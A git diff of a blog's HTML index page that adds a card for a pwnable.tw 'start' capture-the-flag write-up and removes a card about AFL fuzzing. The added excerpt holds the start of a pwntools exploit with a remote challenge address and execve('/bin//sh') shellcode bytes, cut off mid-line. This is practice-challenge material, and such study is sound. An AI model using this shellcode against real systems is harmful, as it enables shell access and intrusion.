@@ -145,6 +145,69 @@
     
     
     <div class="col-12 col-md-8 mx-auto index-info">
+      <a href="/pwnable-tw-start.html">
+        <p class="h4 index-header">pwnable.tw-start</p>
+      </a>
+
+      <a href="/pwnable-tw-start.html">
+        
+        
+          
+        
+        <div class="index-excerpt">
+          <div class="index-text mb-1">start
+checksec
+ida查看
+
+发现只有两个函数，_start 和 _exit ，看到int 80得知，此程序是通过系统调用的方式达到调用函数的目的
+
+
+
+gdb调试得知偏移为20
+
+expfrom pwn import *
+
+context.arch = &#39;i386&#39;
+context.log_level=&quot;debug&quot;
+pro = remote(&quot;chall.pwnable.tw&quot;,10000)
+ret = 0x8048087
+
+shellcode = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&quot;
+&#39;&#39;&#39;
+shellcode = asm(&#39;\n&#39;.join([
+    &#39;push %d&#39; % u32(&#39;/sh\0&#39;),
+    &#39;push %d&#39; % u32(&#39;/bin&#39</div>
+        </div>
+      </a>
+
+      <div class="index-btm">
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2019-08-11&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/pwn">pwn</a>&nbsp;
+          &nbsp;
+        
+        
+          <i class="iconfont icon-tag"></i>
+          
+            <a href="/tags/pwn">pwn</a>&nbsp;
+          
+            <a href="/tags/writeup">writeup</a>&nbsp;
+          
+            <a href="/tags/pwnable-tw">pwnable.tw</a>&nbsp;
+          
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <div class="col-12 col-md-8 mx-auto index-info">
       <a href="/Heap的学习-1.html">
         <p class="h4 index-header">Heap的学习(1)</p>
       </a>
@@ -689,60 +752,6 @@ pip install unicorn
             <a href="/tags/unicorn-engine">unicorn-engine</a>&nbsp;
           
             <a href="/tags/reverse%20tool">reverse tool</a>&nbsp;
-          
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <div class="col-12 col-md-8 mx-auto index-info">
-      <a href="/Fuzz-Test.html">
-        <p class="h4 index-header">Fuzz Test</p>
-      </a>
-
-      <a href="/Fuzz-Test.html">
-        
-        
-          
-        
-        <div class="index-excerpt">
-          <div class="index-text mb-1">基本知识：
-Fuzz Testing(模糊测试)是一种很有效的测试方法,主要原理为构造一系列“坏”数据传入应用程序,通过判断程序是否发生异常发现和检测潜在的bug.而在安全领域引入fuzz技术,无疑可以使安全研究员效率倍增,更有效的挖掘和防护漏洞
-
-工具：AFL-FUZZ简介：
-是目前最高级的Fuzzing测试工具之一,由lcamtu开发
-
-
-当需要测试的程序有源码时,AFL通过对源码重新编译时插桩(插入分析代码)的方法来探测程序内部的执行路径.相对于其他fuzzer,AFL-Fuzz具有更低的性能消耗,更有效的fuzzing策略和tricks最小化技巧,只需简单的配置即可处理复杂的程序
-
-
-对于没有源码的可执行程序,AFL也可进行处理,但需要QEUM模拟器的支持,处理的速度也相对慢很多
-
-安装：推荐环境：ubuntu16.04(省的折腾)
-wget http://lcamtuf.coredump.cx/afl/releases/afl-latest.tgz 
-tar -xzvf afl-latest.tgz &amp;&amp; cd afl-2.52b &amp;&amp; mak</div>
-        </div>
-      </a>
-
-      <div class="index-btm">
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2019-05-14&nbsp;&nbsp;
-        
-        
-          <i class="iconfont icon-inbox"></i>
-          
-            <a href="/categories/fuzz">fuzz</a>&nbsp;
-          &nbsp;
-        
-        
-          <i class="iconfont icon-tag"></i>
-          
-            <a href="/tags/fuzz">fuzz</a>&nbsp;
-          
-            <a href="/tags/afl-fuzzing">afl-fuzzing</a>&nbsp;
           
         
       </div>
